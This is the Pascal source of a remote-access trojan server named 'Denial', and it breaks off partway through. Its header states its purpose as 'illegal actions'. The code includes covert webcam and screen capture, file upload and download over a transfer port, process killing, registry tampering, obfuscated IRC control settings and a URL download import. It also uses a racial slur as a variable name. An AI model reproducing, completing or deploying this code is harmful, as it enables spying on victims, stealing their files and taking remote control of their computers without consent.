
(*  //!!ignore!!
    [[ DENIAL SERVER PART ]]
     Double Threaded Server
    Serverport1 : 44 ( Commands )
    Serverport2 : 45 ( Transfer )
    [[ DENIAL SERVER PART ]]

    Author : SiCmaggOt and SiCmaggOt alone
    Time to create : 3 days
    Purpose : illegal actions
    Allowed to share : No

 IF YOU USE THIS SOURCE CODE IN ANY OF YOUR APPS
 PLEASE COMMAND ME AS THE AUTHOR OF IT. YES I KNOW
 ITS PURE WINSOCK CODING, BUT STILL ITS NOT THE
 EASIEST THING TO LISTEN ON 2 PORTS AT SAME TIME.
                                        // SiC

*)

PROGRAM SERV;
uses
  pngimage in 'pngimage.pas',
  pnglang in 'pnglang.pas',
  pngzlib in 'pngzlib.pas',
  SHELLAPI,
  TLHELP32,
  WINDOWS,
  MESSAGES,
  WINSOCK,
  Unit1 in 'Unit1.pas',
  untWebCam in 'untWebCam.pas';

// Winsock protocol? (;

{$IMAGEBASE $13140000}

const

 FILE_ATTRIBUTE_READONLY             = $00000001;
 FILE_ATTRIBUTE_HIDDEN               = $00000002;
 FILE_ATTRIBUTE_SYSTEM               = $00000004;
 FILE_ATTRIBUTE_ARCHIVE              = $00000020;
 FILE_ATTRIBUTE_DIRECTORY            = $00000010;
 FILE_ATTRIBUTE_NORMAL               = $00000080;
 FILE_ATTRIBUTE_TEMPORARY            = $00000100;
 FILE_ATTRIBUTE_COMPRESSED           = $00000800;
 FILE_ATTRIBUTE_OFFLINE              = $00001000;

 CM_EXIT = WM_USER + $1000;
 PROCESS_TERMINATE = $0001;
 SERVERCLASS1 = '0x77#';                   // Serverclass name 1, registering server 1
 SERVERCLASS2 = '0x76#';                   // Serverclass name 2, registering server 2
 BUFLEN = 65536;                           // set max nr of BUF
 SM_CONNECT = WM_USER + 156;               // declare SM_CONNECT for server part
 SM_SOCKET  = WM_USER + 157;               // declare SM_SOCKET
 ABC3 = 'gUw MIlZBdSt8Lo3EhWx|Np4FiVyaPr5GjYzcQs7Jm0CeTu9Kn1DfXv6Hk2AbRqO';
 ABC2 = 'XTPKGCyvrnkhdaA73jfb840VRNJHDzwtpmigc 61YUQMIEBxusqole95ZWSOLF2&';
 ABC1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 |';
   WM_CAP_START                  = WM_USER;
   WM_CAP_DRIVER_CONNECT         = WM_CAP_START+10;
   WM_CAP_DRIVER_DISCONNECT      = WM_CAP_START+11;
   WM_CAP_SAVEDIB                = WM_CAP_START+25;
   WM_CAP_SET_PREVIEW            = WM_CAP_START+50;
   WM_CAP_SET_PREVIEWRATE        = WM_CAP_START+52;
   WM_CAP_SET_SCALE              = WM_CAP_START+53;
   WM_CAP_GRAB_FRAME             = WM_CAP_START+60;
//                          imafraid -> rdXCjXrK
 I_NICK1 : STRING = 'in1=7AkG                                    ';  // 20 bytes
 I_NICK2 : STRING = 'in2=7AkG                                    ';  // 20 bytes
 I_CHAN1 : STRING = 'ic1=#rdXCjXrK                               ';  // 20 bytes
 I_CHAN2 : STRING = 'ic2=#rdXCjXrK                               ';  // 20 bytes
 I_CKEY1 : STRING = 'ik1=bH6mXvGp                                ';  // 20 bytes
 I_CKEY2 : STRING = 'ik2=bH6mXvGp                                ';  // 20 bytes
 I_MAST1 : STRING = 'im1=                                        ';  // 20 bytes
 I_MAST2 : STRING = 'im2=                                        ';  // 20 bytes
 I_SERV1 : STRING = 'is1=rjP.8aKGjaGb.Ajy                        ';  // 20 bytes
 I_SERV2 : STRING = 'is2=rjP.8aKGjaGb.Ajy                        ';  // 20 bytes
 S_PASSW : STRING = 'pas=bH6mXvGp                '; // 20 bytes
 S_PORT1 : STRING = 'pr1=9LSZ '; // 8 bytes
 S_PORT2 : STRING = 'pr2=9LSW '; // 8 bytes
 S_START : STRING = 'str=e'; // 1 bytes
// S_INJECT: STRING = 'inj=f'; // 1 bytes         tBMHaheG -> bH6mXvGp
 S_REGKEY: STRING = 'key=                                        ';  // 20 bytes
 S_RVALUE: STRING = 'val=                                        ';  // 20 bytes
 S_WNAME : STRING = 'win=                                        ';  // 20 bytes
 S_SNAME : STRING = 'sys=                                        ';  // 20 bytes
 S_CGI   : STRING = 'cgi=                                        ';  // 20 bytes
 S_PHP   : STRING = 'php=                                        ';  // 20 bytes

VAR
 PngObject              : TPngObject;
 CaptureWindow          : dword;
 SENDING                : BOOLEAN;
 // SERVER 1 PARTS :::::: DONT MODIFY NAMES
 REMOTESOCKADDR1        : PSOCKADDR;
 REMOTESOCKADDRLEN1     : PINTEGER;
 MAINWIN1               : HWND;
 MSG1                   : TMSG;
 WSDATA1                : WSADATA;
 BSIZ1                  : LONGINT;
 CONSERVER1             : TSOCKET;
 SOCKETREADISCALLER1    : BOOLEAN;
 CONNECTED1             : BOOLEAN;
 BUF1                   : ARRAY[0..BUFLEN-1]OF CHAR;
 WCLASS1                : TWNDCLASS;
 ASOCKADDR_IN1          : SOCKADDR_IN;
 SERVER1                : TSOCKET;
 INST1                  : HWND;
 // SERVER 2 PARTS :::::: DONT MODIFY NAMES
 REMOTESOCKADDR2        : PSOCKADDR;
 REMOTESOCKADDRLEN2     : PINTEGER;
 MAINWIN2               : HWND;
 MSG2                   : TMSG;
 WSDATA2                : WSADATA;
 BSIZ2                  : LONGINT;
 CONSERVER2             : TSOCKET;
 SOCKETREADISCALLER2    : BOOLEAN;
 CONNECTED2             : BOOLEAN;
 BUF2                   : ARRAY[0..BUFLEN-1]OF CHAR;
 DIR                    : ARRAY[0..BUFLEN-1]OF CHAR;
 WCLASS2                : TWNDCLASS;
 ASOCKADDR_IN2          : SOCKADDR_IN;
 SERVER2                : TSOCKET;

 WINS                   :ARRAY[0..300]OF RECORD NAME:STRING;
 WND                    :HWND;
 END;
 WCNT                   :INTEGER;
 BUF                    : ARRAY[0..BUFLEN-1]OF CHAR;
 INST2                  : HWND;
 DIRFILE                : TEXTFILE;
 DIRPATH                : STRING;
 FILSIZZE               : INTEGER;

 SERV_TRAFFICP          : STRING;
 SERV_TRANSP            : STRING;
 SERV_AUTOSTART         : STRING;
 SERV_REGKEY            : STRING;
 SERV_REGVALUE          : STRING;
 SERV_WINNAME           : STRING;
 SERV_SYSNAME           : STRING;
 SERV_CGI               : STRING;
 SERV_PHP               : STRING;
 PASSWORD               : STRING;

 IRC_NICK1              : STRING;
 IRC_NICK2              : STRING;
 IRC_CHAN1              : STRING;
 IRC_CHAN2              : STRING;
 IRC_SERV1              : STRING;
 IRC_SERV2              : STRING;
 IRC_CKEY1              : STRING;
 IRC_CKEY2              : STRING;
 IRC_MASTER1            : STRING;
 IRC_MASTER2            : STRING;
 A                      : DWORD;

function VisitPage(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';
function capCreateCaptureWindowA(lpszWindowName: pchar; dwStyle: dword; x, y, nWidth, nHeight: word; ParentWin: dword; nId: word): dword; stdcall external 'AVICAP32.DLL';

//!!ignore!!

function Decode(str:string):string;
var
i,j:integer;
ch:string;
c:boolean;
begin
result:='';
for i:=1 to length(str) do begin
 ch := copy(str,i,1);
 c:=false;
 for j:=1 to length(ABC3) do begin
  if copy(ABC3,j,1)=ch then begin
   result:=result+copy(ABC1,j,1);
   c := true;
  end;
 end;
  if not c then result := result + ch;
end;
end;

function GetBitmapFromFile(BitmapPath: string): HBitmap;
begin
  Result := LoadImage(GetModuleHandle(nil), pchar(BitmapPath), IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
end;

function GetBitmapFromWebcam: HBitmap;
var
 WebCam:TWebCamCap;
begin
 Try
  WebCam := TWebCamCap.Create;
  WebCam.TakePicture;
  WebCam.Destroy;
  Result := GetBitmapFromFile(decode('a:\KMUag8.U83'));
  DeleteFile('C:\WebCam.Bmp');
 Except
  Result := 234;
 End;
end;

function GetBitmapFromDesktop: HBitmap;
var
  DC, MemDC: HDC;
  Bitmap, OBitmap: HBitmap;
  BitmapWidth, BitmapHeight: integer;
begin
  DC := GetDC(GetDesktopWindow);
  MemDC := CreateCompatibleDC(DC);
  BitmapWidth := GetDeviceCaps(DC, 8);
  BitmapHeight := GetDeviceCaps(DC, 10);
  Bitmap := CreateCompatibleBitmap(DC, BitmapWidth, BitmapHeight);
  OBitmap := SelectObject(MemDC, Bitmap);
  BitBlt(MemDC, 0, 0, BitmapWidth, BitmapHeight, DC, 0, 0, SRCCOPY);
  SelectObject(MemDC, OBitmap);
  DeleteDC(MemDC);
  ReleaseDC(GetDesktopWindow, DC);
  Result := Bitmap;
end;

function Decrypt(str:string):string;
var
i,j:integer;
ch:string;
c:boolean;
begin
result:='';
for i:=1 to length(str) do begin
 ch := copy(str,i,1);
 c:=false;
 for j:=1 to length(ABC2) do begin
  if copy(ABC2,j,1)=ch then begin
   result:=result+copy(ABC1,j,1);
   c := true;
  end;
 end;
  if not c then result := result + ch;
end;
end;

function encrypt(str:string):string;
var
i,j:integer;
ch:string;
c:boolean;
begin
result:='';
for i:=1 to length(str) do begin
 ch := copy(str,i,1);
 c:=false;
 for j:=1 to length(ABC1) do begin
  if copy(ABC1,j,1)=ch then begin
   result:=result+copy(ABC2,j,1);
   C:=true;
  end;
 end;
 if not c then result := result + ch;
end;

end;

Function GetRegValue(kRoot:Hkey; Path, Value:String):String;
Var
 Key : Hkey;
 Siz : Cardinal;
 Val : Array[0..16382] Of Char;
Begin
 ZeroMemory(@Val, Length(Val));
 RegOpenKeyEx(kRoot, pChar(Path), 0, REG_SZ, Key);
 Siz := 16383;
 RegQueryValueEx(Key, pChar(Value), NIL, NIL, @Val[0], @Siz);
 RegCloseKey(Key);
 If Val<> '' then
  Result := Val;
End;

Function ReadRegedit(kRoot:Hkey;Path:String;Typ:integer):String;
Var
 Keys: Array[0..255] of Char;
 Vals: Array[0..255] of Char;
 A   : Cardinal;
 KEY : HKEY;
 I   : Integer;
 S1  : String;
 S2  : String;
 SYSDIR : String;
 BUF : ARRAY[0..255] of Char;
 TEX : TEXTFILE;
 JONAS:STRING;
Begin
 S1 := '';
 s2 := '';
 GetSystemDirectory(BUF,255);
 Sysdir := BUF;
 Sysdir := Sysdir + '\';
 If Typ=1 then begin
 ASSIGNFILE(Tex, Sysdir+decode('\CrGcr1.QeT'));
 REWRITE(Tex);
 For i:=0 To 16383 do begin
  RegOpenKeyEx(kRoot, pChar(Path), 0, KEY_ENUMERATE_SUB_KEYS, KEY);
  A:=2048;
  If RegEnumKeyEx(Key, I, Keys, A, NIL, NIL, NIL, NIL) = ERROR_SUCCESS Then
   WRITELN(Tex, Encrypt(Keys))
  Else Break;
 End;
 RegCloseKey(Key);
 CLOSEFILE(TEX);
 End Else Begin
 ASSIGNFILE(Tex, Sysdir+decode('\CrG9VQ.QeT'));
 REWRITE(Tex);
 For i:=0 To 16383 do begin
  RegOpenKeyEx(kRoot, pChar(Path), 0, KEY_QUERY_VALUE, KEY);
  A:=2048;
  If RegEnumValue(Key, I, Vals, A, NIL, NIL, NIL, NIL) = ERROR_SUCCESS Then begin
   JONAS := VALS;
   JONAS := JONAS + chr(0160)+getregvalue(kRoot, Path, Vals);
   WRITELN(TEX,ENCRYPT(JONAS));
  End Else Break;
 End;
 RegCloseKey(Key);
 CloseFile(Tex);
 end;
End;

Procedure DeleteRegKey(kRoot:Hkey; Path, Value:String);
Var
 Key : Hkey;
Begin
 RegOpenKeyEx(kRoot, pChar(Path), 0, KEY_ALL_ACCESS, KEY);
 RegDeleteKey(Key, pChar(Value));
 RegCloseKey(Key);
End;

Procedure DeleteRegValue(kRoot:Hkey; Path, Value:String);
Var
 Key : Hkey;
Begin
 RegOpenKeyEx(kRoot, pChar(Path), 0, KEY_SET_VALUE, KEY);
 RegDeleteValue(Key, pChar(Value));
 RegCloseKey(Key);
End;

Procedure SetRegValue(kRoot:Hkey; Path, Value, Str:String);
Var
 Key : Hkey;
 Siz : Cardinal;
Begin
 RegOpenKey(kRoot, pChar(Path), Key);
 Siz := 2048;
 RegSetValueEx( Key, pChar(Value), 0, REG_SZ, @Str[1], Siz);
 RegCloseKey(Key);
End;

Function RReg(SS:String):String;
Var
 Key : Hkey;
 DataSize : Integer;
 Value : ARRAY[0..1023] OF CHAR;
Begin
 ZEROMEMORY(@VALUE,LENGTH(VALUE));
 SLEEP(10);
 REGOPENKEYEX(HKEY_LOCAL_MACHINE, PCHAR(decode('eJ5TKVCr\sBwhoWoIx\PMLBgt')), 0, REG_SZ, KEY);
 DATASIZE := 1024;
 REGQUERYVALUEEX(KEY, PCHAR(SS), NIL, NIL, @VALUE[0], @DATASIZE);
 REGCLOSEKEY(KEY);
 IF VALUE <> NIL THEN RESULT := STRING(VALUE) ELSE EXIT;
End;

PROCEDURE LOADREG;
BEGIN
IRC_NICK1       := RREG(ENCRYPT(decode('LBwSX')));
IRC_NICK2       := RREG(ENCRYPT(decode('LBwSv')));
IRC_CHAN1       := RREG(ENCRYPT(decode('wZgLX')));
IRC_CHAN2       := RREG(ENCRYPT(decode('wZgLv')));
IRC_SERV1       := RREG(ENCRYPT(decode('WMhNX')));
IRC_SERV2       := RREG(ENCRYPT(decode('WMhNv')));
IRC_CKEY1       := RREG(ENCRYPT(decode('wSMFX')));
IRC_CKEY2       := RREG(ENCRYPT(decode('wSMFv')));
IRC_MASTER1     := RREG(ENCRYPT(decode('8gWxMhX')));
IRC_MASTER2     := RREG(ENCRYPT(decode('8gWxMhv')));
SERV_TRAFFICP   := RREG(ENCRYPT(decode('3ohxX')));
SERV_TRANSP     := RREG(ENCRYPT(decode('3ohxv')));
SERV_AUTOSTART  := RREG(ENCRYPT(decode('g|xoWxghx')));
SERV_REGKEY     := RREG(ENCRYPT(decode('hMlSMF')));
SERV_REGVALUE   := RREG(ENCRYPT(decode('hMlNgt|M')));
SERV_WINNAME    := RREG(ENCRYPT(decode('ppBL')));
SERV_SYSNAME    := RREG(ENCRYPT(decode('pWFW')));
SERV_CGI        := RREG(ENCRYPT(decode('wlB')));
SERV_PHP        := RREG(ENCRYPT(decode('3Z3')));
PASSWORD        := RREG(ENCRYPT(decode('3gWWpoh ')));
END;

Procedure SaveReg;
Var
 Key : Hkey;
 DataSize : Cardinal;
 Value : String;
Begin
 RegOpenKey(HKEY_LOCAL_MACHINE,pChar(decode('eoIxpghM\sBwhoWoIx')),Key);
 RegCreateKey(Key,pChar(decode('PMLBgt')), Key);
 RegCloseKey(Key);
 RegOpenKey(HKEY_LOCAL_MACHINE,'Software\Microsoft\Denial',Key);
 DataSize := 1024;
 RegSetValueEx(Key, Pchar(Encrypt(decode('LBwSX'))), 0, REG_SZ, @IRC_NICK1[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('LBwSv'))), 0, REG_SZ, @IRC_NICK2[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('wZgLX'))), 0, REG_SZ, @IRC_CHAN1[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('wZgLv'))), 0, REG_SZ, @IRC_CHAN2[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('wSMFX'))), 0, REG_SZ, @IRC_CKEY1[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('wSMFv'))), 0, REG_SZ, @IRC_CKEY2[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('WMhNX'))), 0, REG_SZ, @IRC_SERV1[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('WMhNv'))), 0, REG_SZ, @IRC_SERV2[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('8gWxMhX'))), 0, REG_SZ, @IRC_MASTER1[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('8gWxMhv'))), 0, REG_SZ, @IRC_MASTER2[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('wlB'))), 0, REG_SZ, @SERV_CGI[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('3Z3'))), 0, REG_SZ, @SERV_PHP[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('3ohxX'))), 0, REG_SZ, @SERV_TRAFFICP[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('3ohxv'))), 0, REG_SZ, @SERV_TRANSP[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('g|xoWxghx'))), 0, REG_SZ, @SERV_AUTOSTART[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('hMlSMF'))), 0, REG_SZ, @SERV_REGKEY[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('hMlNgt|M'))), 0, REG_SZ, @SERV_REGVALUE[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('ppBL'))), 0, REG_SZ, @SERV_WINNAME[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('pWFW'))), 0, REG_SZ, @SERV_SYSNAME[1], Datasize);
 RegSetValueEx(Key, Pchar(Encrypt(decode('3gWWpoh '))), 0, REG_SZ, @PASSWORD[1], Datasize);
 RegCloseKey(Key);
End;

function GetDrives:string;
var
   p:integer;
   This,All,c,f,cDrives:string;
begin
   c:=';';
   f:=Chr(0);
   SetLength(cDrives,300);
   GetLogicalDriveStrings(300,PChar(cDrives));
   p:=Pos(f,cDrives);
   while p > 0 do
   begin
      This:=Copy(cDrives,1,p - 1);
      if Length(This) <> 3 then Break;
      cDrives:=Copy(cDrives,p + 1,Length(cDrives));
      p:=Pos(f,cDrives);
      All:=All + This + c;
   end;
   GetDrives:=all;
end;

function IntToStr(X: integer): string;
var
 S: string;
begin
 Str(X, S);
 Result := S;
end;

function StrToInt(S: string): integer;
var
 V, Code: integer;
begin
 Val(S, V, Code);
 Result := V;
end;

function enumwinproc(w:hwnd;lpr:lparam):boolean;stdcall;
begin
  if iswindowvisible(w) then begin
    getwindowtext(w,buf,10000);
    if buf[0]<>#0 then begin
      wins[wcnt].name:=buf;
      wins[wcnt].wnd:=w;
      wcnt:=wcnt+1;
    end;
  end;
  result:=true;
end;

function sendwindows:string;
var i:integer;
begin
 result:='';
  wcnt:=0;
  enumwindows(@enumwinproc,0);
  for i:=0 to wcnt-1 do begin
    result:=result+inttostr(wins[i].wnd)+':'+wins[i].name+';';
    wins[i].name := '';
    wins[i].wnd := 0;
  end;
end;
function getwins:string;
begin
 result:='';
 result:=sendwindows;
end;

FUNCTION LISTPROC:STRING;
VAR
  CONTINUELOOP  :       BOOLEAN;
  HSNAPSHOT     :       THANDLE;
  LPPE          :       TPROCESSENTRY32;
  LPME          :       TMODULEENTRY32;
BEGIN
  HSNAPSHOT := CREATETOOLHELP32SNAPSHOT(TH32CS_SNAPPROCESS OR TH32CS_SNAPMODULE, 0);
  LPPE.DWSIZE := SIZEOF(LPPE);
  CONTINUELOOP := PROCESS32FIRST(HSNAPSHOT, LPPE);
  WHILE (INTEGER(CONTINUELOOP) <> 0) DO
  BEGIN
   RESULT := RESULT + LPPE.SZEXEFILE+':'+INTTOSTR(LPPE.TH32PROCESSID)+';';
   CONTINUELOOP := PROCESS32NEXT(HSNAPSHOT, LPPE);
  END;
  CLOSEHANDLE(HSNAPSHOT);
END;

PROCEDURE KILLPROC(S:STRING);
VAR
  RET           :       BOOL;
  PROCESSID     :       INTEGER;
  PROCESSHNDLE  :       THANDLE;
BEGIN
  IF S = '' THEN EXIT;
  TRY
    PROCESSID := STRTOINT('$' + S);
    PROCESSHNDLE := OPENPROCESS(PROCESS_TERMINATE, BOOL(0), PROCESSID);
    RET := TERMINATEPROCESS(PROCESSHNDLE, 0);
    IF INTEGER(RET) = 0 THEN EXIT;
  EXCEPT
    EXIT;
  END;
END;

PROCEDURE LISTDIR(D:STRING);
const
  faReadOnly  = $00000001 platform;
  faHidden    = $00000002 platform;
  faSysFile   = $00000004 platform;
  faVolumeID  = $00000008 platform;
  faDirectory = $00000010;
  faArchive   = $00000020 platform;
  faAnyFile   = $0000003F;
var
nigger:string;
stfu:integer;
type
  TFileName = type string;
  TSearchRec = record
    Time: Integer;
    Size: Integer;
    Attr: Integer;
    Name: TFileName;
    ExcludeAttr: Integer;
    FindHandle: THandle  platform;
    FindData: TWin32FindData  platform;
  end;

  LongRec = packed record
    case Integer of
      0: (Lo, Hi: Word);
      1: (Words: array [0..1] of Word);
      2: (Bytes: array [0..3] of Byte);
  end;

  function FindMatchingFile(var F: TSearchRec): Integer;
  var
    LocalFileTime: TFileTime;
  begin
    with F do
    begin
      while FindData.dwFileAttributes and ExcludeAttr <> 0 do
        if not FindNextFile(FindHandle, FindData) then
        begin
          Result := GetLastError;
          Exit;
        end;
      FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
      FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
        LongRec(Time).Lo);
      Size := FindData.nFileSizeLow;
      FILSIZZE := FINDDATA.NFILESIZELOW;
      Attr := FindData.dwFileAttributes;
      STFU := FindData.dwFileAttributes;
      Name := FindData.cFileName;
      nigger := name;
      ASSIGNFILE(DIRFILE,DIRPATH);
      APPEND(DIRFILE);
      IF (STFU AND FILE_ATTRIBUTE_DIRECTORY) = FILE_ATTRIBUTE_DIRECTORY THEN
       WRITELN(DIRFILE, ENCRYPT(NAME+'\'+decode(';f;')+D))
      ELSE
       WRITELN(DIRFILE, ENCRYPT(NAME+';'+inttostr(FILSIZZE)+';'+D));
      CLOSEFILE(DIRFILE);
    end;
    Result := 0;
  end;

  procedure FindClose(var F: TSearchRec);
  begin
    if F.FindHandle <> INVALID_HANDLE_VALUE then
    begin
      Windows.FindClose(F.FindHandle);
      F.FindHandle := INVALID_HANDLE_VALUE;
    end;
  end;

  function FindFirst(const Path: string; Attr: Integer; 
    var  F: TSearchRec): Integer;
  const
    faSpecial = faHidden or faSysFile or faVolumeID or faDirectory; 
  begin 
    F.ExcludeAttr := not Attr and faSpecial;
    F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
    if F.FindHandle <> INVALID_HANDLE_VALUE then
    begin
      Result := FindMatchingFile(F);
      if Result <> 0 then FindClose(F);
    end else
      Result := GetLastError;
  end; 
 
  function FindNext(var F: TSearchRec): Integer;
  begin
    if FindNextFile(F.FindHandle, F.FindData) then
      Result := FindMatchingFile(F) else
      Result := GetLastError;
  end;
VAR
  SR: TSEARCHREC;
BEGIN
  GETSYSTEMDIRECTORY(DIR,255);
  DIRPATH := DIR;
  DIRPATH := DIRPATH + decode('\5YQre.QeT');
  DELETEFILE(PCHAR(DIRPATH));
  ASSIGNFILE(DIRFILE,DIRPATH);
  REWRITE(DIRFILE);
  WRITELN(DIRFILE, ENCRYPT(D));
  CLOSEFILE(DIRFILE);
TRY
  If D[Length(D)] <> '\' then D := D + '\';
  If FindFirst(D + decode('*.*'), faDirectory, SR) = 0 then
    Repeat
      SLEEP(0);
    Until (FindNext(SR) <> 0);
  FindClose(SR);
EXCEPT
 EXIT;
END;
END;

function ReceiveBuffer(var Buffer; BufferSize: integer): integer;
begin
  if BufferSize = -1 then
  begin
    if ioctlsocket(conserver2, FIONREAD, Longint(Result)) = SOCKET_ERROR then
    begin
      Result := SOCKET_ERROR;
     CloseSocket(conserver2);
     Shutdown(conserver2,2);
    end;
  end
  else
  begin
     Result := recv(conserver2, Buffer, BufferSize, 0);
     if Result = 0 then
     begin
     CloseSocket(conserver2);
     Shutdown(conserver2,2);
     end;
     if Result = SOCKET_ERROR then
     begin
       Result := WSAGetLastError;
       if Result = WSAEWOULDBLOCK then
       begin
         Result := 0;
       end
       else
       begin
        CloseSocket(conserver2);
        Shutdown(conserver2,2);
       end;
     end;
  end;
end;

function ReceiveLength: integer;
begin
  Result := ReceiveBuffer(pointer(nil)^, -1);
end;

function ReceiveString: string;
begin
  SetLength(Result, ReceiveBuffer(pointer(nil)^, -1));
  SetLength(Result, ReceiveBuffer(pointer(Result)^, Length(Result)));
end;

procedure Idle(Seconds: integer);
var
  FDset: TFDset;
  TimeVal: TTimeVal;
begin
  if Seconds = 0 then
  begin
    FD_ZERO(FDSet);
    FD_SET(conserver2, FDSet);
    select(0, @FDset, nil, nil, nil);
  end
  else
  begin
    TimeVal.tv_sec := Seconds;
    TimeVal.tv_usec := 0;
    FD_ZERO(FDSet);
    FD_SET(conserver2, FDSet);
    select(0, @FDset, nil, nil, @TimeVal);
  end;
end;

procedure ReceiveFile(FileName: string);
var
  BinaryBuffer: pchar;
  BinaryFile: THandle;
  BinaryFileSize, BytesReceived, BytesWritten, BytesDone: dword;
begin
  BytesDone := 0;
  BinaryFile := CreateFile(pchar(FileName), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  Idle(0);
  ReceiveBuffer(BinaryFileSize, sizeof(BinaryFileSize));
  while BytesDone < BinaryFileSize do
  begin
    Sleep(1);
    if not sending then begin
  CloseHandle(BinaryFile);
  exit;
    end;
    BytesReceived := ReceiveLength;
    if BytesReceived > 0 then
    begin
      GetMem(BinaryBuffer, BytesReceived);
      try
        ReceiveBuffer(BinaryBuffer^, BytesReceived);
        WriteFile(BinaryFile, BinaryBuffer^, BytesReceived, BytesWritten, nil);
        Inc(BytesDone, BytesReceived);
      finally
        FreeMem(BinaryBuffer);
      end;
    end;
  end;
  CloseHandle(BinaryFile);
end;

function SendBuffer(var Buffer; BufferSize: integer): integer;
var
  ErrorCode: integer;
begin
  Result := send(conserver2, Buffer, BufferSize, 0);
  if Result = SOCKET_ERROR then
  begin
    ErrorCode := WSAGetLastError;
    if (ErrorCode = WSAEWOULDBLOCK) then
    begin
      Result := -1;
    end
    else
    begin
     CloseSocket(conserver2);
     Shutdown(conserver2,2);
    end;
  end;
end;

procedure SendFile(FileName: string);
var
  BinaryFile: THandle;
  BinaryBuffer: pchar;
  BinaryFileSize, BytesRead: dword;
begin
  BinaryFile := CreateFile(pchar(FileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  BinaryFileSize := GetFileSize(BinaryFile, nil);
  SendBuffer(BinaryFileSize, sizeof(BinaryFileSize));
  GetMem(BinaryBuffer, 2048);
  try
    repeat
      Sleep(1);
      ReadFile(BinaryFile, BinaryBuffer^, 2048, BytesRead, nil);
      if not sending then begin
       FreeMem(BinaryBuffer);
       CloseHandle(BinaryFile);
       Exit;
      end;
      repeat
        Sleep(1);
        if not sending then begin
         FreeMem(BinaryBuffer);
         CloseHandle(BinaryFile);
         Exit;
        end;
      until SendBuffer(BinaryBuffer^, BytesRead) <> -1;
    until BytesRead < 2048;
  finally
    FreeMem(BinaryBuffer);
  end;
  CloseHandle(BinaryFile);
end;

function SendString(const Buffer: string): integer;
begin
  Result := SendBuffer(pointer(Buffer)^, Length(Buffer));
end;


FUNCTION RECEIVECMD2:STRING;
VAR
 STR    : SHORTSTRING;
 RES    : SHORTSTRING;
 TMP    : CARDINAL;
LABEL Z;
BEGIN
 STR := '';
 RES := '';
 TMP := GETTICKCOUNT;
 REPEAT
  Z:
  BSIZ2 := RECV(CONSERVER2, STR[1], 255, 0);
  IF BSIZ2 = -1 THEN BEGIN
   BSIZ2 := WSAGETLASTERROR;
   IF BSIZ2 = WSAEWOULDBLOCK THEN BEGIN
    IF SOCKETREADISCALLER2 THEN BEGIN
     {IF TMP + 500 <= GETTICKCOUNT THEN} BEGIN
      RES := decode('r!')+#13;
      BREAK;
     END;
    END;
    CONTINUE;
   END ELSE BEGIN
    BREAK;
   END;
  END;
  SETLENGTH(STR, BSIZ2);
  RES := RES + STR;
  IF NOT CONNECTED2 THEN BREAK;
  IF TMP + 40000 <= GETTICKCOUNT THEN BREAK;
  IF RES = '' THEN GOTO Z;
 UNTIL RES[LENGTH(RES)] = #13;
 SETLENGTH(RES, LENGTH(RES) - 1);
 RESULT := RES;
END;

PROCEDURE SOCKETREAD2;
VAR
 I      : INTEGER;
 STR    : STRING;
 AN     : STRING;
 CMD    : STRING;
 PARAM  : STRING;
BEGIN
 SOCKETREADISCALLER2 := TRUE;
 STR := receivecmd2;
 SOCKETREADISCALLER2 := FALSE;
 STR := DECRYPT(STR);
 CMD := COPY(STR, 1, 2);
 PARAM := COPY(STR, 3, LENGTH(STR));
 IF CMD = decode('vf') THEN BEGIN
  SENDING := TRUE;
  RECEIVEFILE(PARAM);
  SENDING := FALSE;
 END ELSE
 IF CMD = decode('vX') THEN BEGIN
  SENDING := TRUE;
  SLEEP(100);
  SENDFILE(PARAM);
  SENDING := FALSE;
 END;
END;

FUNCTION WIN2(WIN:HWND; MESS:WORD; WPR:WORD; LPR:LONGINT):LONGINT; STDCALL;
VAR
 AN:STRING;
BEGIN
 RESULT := 0;
 CASE MESS OF
  SM_CONNECT: BEGIN
   IF CONNECTED2 THEN BEGIN
    EXIT;
   END;
   REMOTESOCKADDRLEN2^ := SIZEOF(REMOTESOCKADDR2^);
   CONSERVER2 := ACCEPT(SERVER2, REMOTESOCKADDR2, REMOTESOCKADDRLEN2);
   WSAASYNCSELECT(CONSERVER2, MAINWIN2, SM_SOCKET, FD_READ OR FD_CLOSE);
   AN := encrypt('0');
   SEND(CONSERVER2, AN[1], LENGTH(AN), 0);
   CONNECTED2 := TRUE;
   EXIT;
  END;
  SM_SOCKET: CASE LOWORD(LPR) OF
   FD_READ: SOCKETREAD2;
   FD_CLOSE: BEGIN
    CONNECTED2 := FALSE;
    SENDING := FALSE;
    EXIT;
   END;
  END;
  WM_CLOSE: BEGIN
   SENDING := FALSE;
   POSTQUITMESSAGE(0);
   EXITPROCESS(0);
  END;
  WM_DESTROY: BEGIN
   SENDING := FALSE;
   POSTQUITMESSAGE(0);
   EXITPROCESS(0);
  END;
  WM_QUIT: BEGIN
